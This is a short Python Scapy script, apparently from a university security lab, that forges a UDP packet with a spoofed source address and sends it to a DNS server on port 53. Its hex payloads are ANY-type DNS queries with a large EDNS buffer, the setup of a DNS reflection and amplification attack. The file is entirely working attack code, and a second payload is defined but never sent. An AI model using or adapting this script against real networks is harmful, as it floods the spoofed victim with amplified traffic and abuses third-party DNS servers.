#!/bin/python3

from scapy.all import *

A = "10.0.0.3" # spoofed source IP address
B = "10.0.0.2" # destination IP address
C = 80 # source port
D = 53 # destination port

payload = "4f2501200001000000000001126c6f75646c792d707572706c652d73656e6408736563757269747907757477656e7465026e6c0000ff00010000291000000000000000"

payload2 = "47e50120000100000000000112707269736f6e2d696e6b2d6a6f7368696e6708736563757269747907757477656e7465026e6c0000ff00010000291000000000000000" # packet payload

spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / bytes.fromhex(payload)
send(spoofed_packet)
